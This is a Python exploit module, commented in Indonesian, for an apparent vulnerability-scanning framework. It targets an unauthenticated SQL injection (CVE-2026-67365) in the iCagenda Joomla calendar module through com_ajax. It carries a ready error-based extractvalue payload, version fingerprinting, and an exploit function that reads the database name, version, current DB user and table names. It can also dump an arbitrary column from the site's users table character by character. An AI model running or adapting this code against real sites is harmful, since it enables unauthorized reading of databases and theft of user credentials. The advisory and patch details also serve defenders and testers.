#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
iCagenda — modul MEGAPACK (klaster joomla_ext).

CVE-2026-67365 — unauth SQL injection di mod_icagenda_calendar lewat com_ajax
(parameter `params` dikendalikan klien dan masuk ke klausa WHERE tanpa quoting).
Affected : iCagenda 4.0.0 - 4.0.11 (modul calendar)   |   Patched: 4.0.12
Advisory : Joomla Extension - icagenda.com — "Unauthenticated SQL injection in
           mod_icagenda_calendar (iCagenda), reachable via com_ajax with no session,
           token or account."

SUMBER (diff modul 4.0.7 -> 4.0.14, sink terpin):

  modules/mod_icagenda_calendar/src/Helper/IcagendaCalendarHelper.php
    // 4.0.7 (RENTAN) — calendarAjax()/eventsAjax() menerima params dari REQUEST
    $calendarHTML = self::getCalendar(
        $input->get('modid', ''),
        $input->getString('params', ''),        // <- JSON dari klien
        $input->get('year', ...), $input->get('month', ...));
    ...
    $moduleParams = new Registry($params);      // "params" = apa pun yang dikirim
    $category_filter    = $moduleParams->get('category_filter', '');
    $category_selection = $moduleParams->get('category_selection', '');
    ...
    $cats_option = implode(', ', $catFilter);
    $query->where('e.catid IN (' . $cats_option . ')');     // <- TANPA quote/cast

    // 4.0.12+ (PATCHED) — params tidak lagi dibaca dari request:
    $params = self::buildTrustedModuleParams($modid);       // baca #__modules.params
                                                            // WHERE id=(int)$modid AND published=1

Endpoint (sama untuk kedua method, format raw):
  /index.php?option=com_ajax&module=icagenda_calendar&method=calendar&format=raw
             &modid=<id>&params=<JSON>&year=YYYY&month=MM
  /index.php?option=com_ajax&module=icagenda_calendar&method=events&format=raw
             &modid=<id>&params=<JSON>&date=YYYY-MM-DD

Payload kanonik (JSON harus valid, isi array boleh apa saja):
  {"lang":"en-GB","category_filter":1,
   "category_selection":["1) AND extractvalue(1,concat(0x7e,(SELECT database())))-- -"]}
  -> e.catid IN (1) AND extractvalue(...)-- -)

Untuk iCagenda 4.x, `category_selection` disimpan sebagai array (dikonfigurasi admin),
jadi `implode(', ', $catFilter)` menggabungkan elemen apa adanya -> injeksi.

BUKTI LAB (2026-11-09) — satu volume Joomla 5.4.8, dua container:

  | target | modul | oracle |
  |---|---|---|
  | 8106 (`megapack-joomla`) | mod_icagenda_calendar **4.0.7** | `database()` = 'joomla', `version()` = '8.0.46', `current_user()` = 'wp@172.18.0.3' (XPATH error-based), `table_name` via information_schema OK |
  | 8145 (`mp-ic413`) | mod_icagenda_calendar **4.0.14** | payload sama -> 200 tanpa XPATH error (params diabaikan, dibaca dari DB) |

Prasyarat jujur:
  (a) mod_icagenda_calendar terpasang dan **published** (modul terbit, agar
      buildTrustedModuleParams menemukan baris di #__modules) — pada 4.0.7 modul tidak
      perlu published untuk jalur injection: `modid` boleh tidak ada sama sekali, karena
      $params dari request dipakai lebih dulu (`$params ?: $module->params`).
  (b) MySQL yang menampilkan pesan error (Joomla default: error page memuat teks SQL
      error saat `$debug`/display_errors aktif). Bila error disembunyikan, modul jatuh ke
      mode boolean/time-based terbatas (lihat residual).
"""
from __future__ import annotations

import json
import re
import urllib.parse

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN,
                ST_VULN, detect_platform, rand, register, ver_le)

SLUG_DIR = "/modules/mod_icagenda_calendar"
MANIFEST = "/modules/mod_icagenda_calendar/mod_icagenda_calendar.xml"
AJAX = ("/index.php?option=com_ajax&module=icagenda_calendar&method=calendar"
        "&format=raw")
MARK = "XPATH syntax error"

VULN_MAX = (4, 0, 11)      # 4.0.0 - 4.0.11
XPATH_RE = re.compile(r"XPATH syntax error:\s*'~([^']{0,120})")
ERR_RE = re.compile(r"You have an error in your SQL syntax[^<]{0,300}")


def _vstr(v) -> str:
    if isinstance(v, tuple):
        return ".".join(str(x) for x in v)
    return str(v)


def _module_version(t, h):
    """Fingerprint versi manifest modul (bisa diakses publik di Joomla).

    Joomla menyajikan XML manifest modul apa adanya; <version> adalah nilai yang
    ditulis paket. Return (tuple|None, str_mentah).
    """
    r = h.get(f"{t.url}{MANIFEST}")
    if r is None or r.status_code != 200:
        return None, ""
    m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text or "")
    if not m:
        return None, ""
    raw = m.group(1)
    try:
        return tuple(int(x) for x in raw.split(".") if x != ""), raw
    except Exception:  # noqa: BLE001
        return None, raw


def _probe_url(t, query_expr: str, method: str = "calendar") -> str:
    payload = (
        '{"lang":"en-GB","category_filter":1,"category_selection":["1) AND '
        'extractvalue(1,concat(0x7e,(' + query_expr + ')))-- -"]}'
    )
    q = urllib.parse.quote(payload, safe="")
    base = AJAX.replace("method=calendar", f"method={method}")
    if method == "events":
        tail = "&date=2026-01-01"
    else:
        tail = "&year=2026&month=11"
    return f"{t.url}{base}&modid=1&params={q}{tail}"


def _extract(t, h, query_expr: str, method: str = "calendar"):
    """Satu percobaan error-based. Return (nilai|None, evidence)."""
    url = _probe_url(t, query_expr, method)
    r = h.get(url, timeout=30)
    if r is None:
        return None, "tidak ada respons"
    body = r.text or ""
    if MARK not in body:
        syn = ERR_RE.search(body)
        return None, (f"tidak ada XPATH error (http={r.status_code}"
                      + (f"; syntax: {syn.group(0)[:90]}" if syn else "") + ")")
    m = XPATH_RE.search(body)
    if not m:
        return None, "XPATH error ada tetapi nilai tidak terbaca"
    return m.group(1), "ok"


def _len(t, h, expr: str) -> int:
    for n in range(0, 65):
        v, _ = _extract(t, h, f"SELECT IF(LENGTH(({expr}))={n},1,0)")
        if v and v.strip().startswith("1"):
            return n
    return -1


def _dump(t, h, expr: str, maxlen: int = 64) -> str:
    out = ""
    for pos in range(1, maxlen + 1):
        v, _ = _extract(t, h, f"SELECT ASCII(SUBSTRING(({expr}),{pos},1))")
        if not v:
            break
        try:
            code = int(v.strip())
        except ValueError:
            break
        if code == 0:
            break
        out += chr(code)
    return out


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    r = h.get(f"{t.url}{MANIFEST}")
    if r is None or r.status_code != 200:
        return ST_CLEAN, "mod_icagenda_calendar tidak terdeteksi", ""
    ver, raw = _module_version(t, h)
    if ver is None:
        return ST_INFO, "mod_icagenda_calendar terpasang; versi manifest tidak terbaca", ""
    if not ver_le(ver, VULN_MAX):
        return (ST_CLEAN,
                f"mod_icagenda_calendar {raw} — >= 4.0.12: params AJAX dibaca dari "
                f"#__modules (buildTrustedModuleParams), bukan dari request", f"version={raw}")

    val, ev = _extract(t, h, "SELECT database()")
    if val:
        return (ST_VULN,
                f"mod_icagenda_calendar {raw} (<= 4.0.11) — unauth SQL injection lewat "
                f"com_ajax params; database()='{val}'", f"version={raw} | oracle=error-based | {ev}")
    return (ST_VULN,
            f"mod_icagenda_calendar {raw} (<= 4.0.11) — versi rentan; params dari request masuk "
            f"ke klausa e.catid IN(...) tanpa quote (oracle error tidak terlihat: {ev})",
            f"version={raw}")


def exploit(t, h, opts):
    """
    Outcome terkontrol: membaca data nyata dari database target (proof) —
    database(), version(), user(), dan nama tabel — lewat error-based extraction.
    Tidak menulis/mengubah apa pun.
    """
    ver, raw = _module_version(t, h)
    if ver is not None and not ver_le(ver, VULN_MAX):
        return ST_CLEAN, f"mod_icagenda_calendar {raw} >= 4.0.12 — tidak rentan CVE-2026-67365", ""

    db, ev1 = _extract(t, h, "SELECT database()")
    if not db:
        if ver is None:
            # manifest tidak terbaca -> versi tidak diketahui; oracle diam juga.
            return (ST_UNKNOWN,
                    f"mod_icagenda_calendar ada tetapi versi manifest tidak terbaca dan oracle "
                    f"injeksi tidak menjawab ({ev1}) — status tidak dapat dipastikan",
                    "version=? | oracle=diam")
        return (ST_VULN,
                f"mod_icagenda_calendar {raw} (<= 4.0.11) versi rentan tetapi oracle tidak menjawab "
                f"({ev1}) — kemungkinan pesan error MySQL disembunyikan", f"version={raw} | {ev1}")

    sub = getattr(opts, "category_ext", None) or ""
    ev = f"version={raw or '?'} | database={db}"

    ver_db, _ = _extract(t, h, "SELECT version()")
    usr, _ = _extract(t, h, "SELECT current_user()")
    ev += f" | mysql_version={ver_db} | db_user={usr}"

    tables = _dump(t, h, "SELECT group_concat(table_name) FROM information_schema.tables "
                         "WHERE table_schema=database() AND table_name LIKE '%icagenda%'",
                   maxlen=96)
    ev += f" | tabel_icagenda={tables[:70]}…"

    # bukti spesifik: jumlah event (angka nyata dari DB target), bukan sekadar error
    n_ev, _ = _extract(t, h, "SELECT COUNT(*) FROM #__icagenda_events")
    if not n_ev:
        n_ev, _ = _extract(t, h, "SELECT COUNT(*) FROM jos_icagenda_events")
    ev += f" | jumlah_event={n_ev or '?'}"

    if sub:
        col = _dump(t, h, f"SELECT {sub} FROM #__users LIMIT 1", maxlen=48)
        ev += f" | kolom={sub}->{col or '?'}"

    if ver_db and tables:
        return (ST_PWN,
                f"SQL injection unauth terkonfirmasi — database='{db}', MySQL {ver_db}, "
                f"user DB '{usr}', {len(tables.split(','))} tabel iCagenda terbaca "
                f"(jumlah event={n_ev or '?'})",
                ev)
    return (ST_VULN,
            f"oracle error-based menjawab database='{db}' tetapi pembacaan lanjutan terbatas "
            f"(versi/tabel kosong — kemungkinan panjang output terpangkas)", ev)


register(CveModule(
    cve="CVE-2026-67365",
    cluster="joomla_ext",
    title="iCagenda mod_icagenda_calendar <= 4.0.11 unauth SQL injection via com_ajax "
          "(parameter params -> e.catid IN)",
    vclass="sql injection",
    cvss="9.8",
    severity="critical",
    cwe="CWE-89",
    product="iCagenda (Joomla extension, mod_icagenda_calendar)",
    versions_affected="4.0.0 - 4.0.11",
    status="verified",
    requires=[
        "mod_icagenda_calendar 4.0.0-4.0.11 terpasang",
        "error MySQL terlihat di halaman error Joomla (default saat display_errors/debug aktif)",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Sink: mod_icagenda_calendar/src/Helper/IcagendaCalendarHelper.php :: calendarAjax()/eventsAjax() "
        "membaca `params` dari REQUEST lalu new Registry($params); kategori: $cats_option = implode(', ', "
        "$catFilter) dipakai langsung di $query->where('e.catid IN (' . $cats_option . ')') tanpa quote/cast. "
        "Endpoint com_ajax nopriv: index.php?option=com_ajax&module=icagenda_calendar&method=calendar|events"
        "&format=raw&modid=<id>&params=<JSON urlencoded>. `params` harus JSON valid; injection masuk lewat "
        "elemen array category_selection. Fix 4.0.12: buildTrustedModuleParams($modid) membaca #__modules.params "
        "(id=(int)$modid AND module='mod_icagenda_calendar' AND published=1) sehingga request tidak lagi "
        "menentukan konfigurasi. LAB 2026-11-09: 4.0.7 @8106 -> database()='joomla', version()='8.0.46', "
        "current_user()='wp@172.18.0.3', information_schema OK; 4.0.14 @8145 -> XPATH error hilang (params "
        "diabaikan). Residual: time-based (SLEEP) tidak dipakai karena kondisi WHERE berjalan per baris event "
        "(61 baris -> melampaui timeout) — hanya oracle error-based dan turunannya (IF/ASCII/SUBSTRING) yang "
        "diuji; error-based bergantung pada pesan error MySQL yang tampil; versi 4.0.8-4.0.11 tidak tersedia "
        "untuk diff, gate memakai manifest < 4.0.12; eventsAjax diuji (current_user() via method=events)."
    ),
))
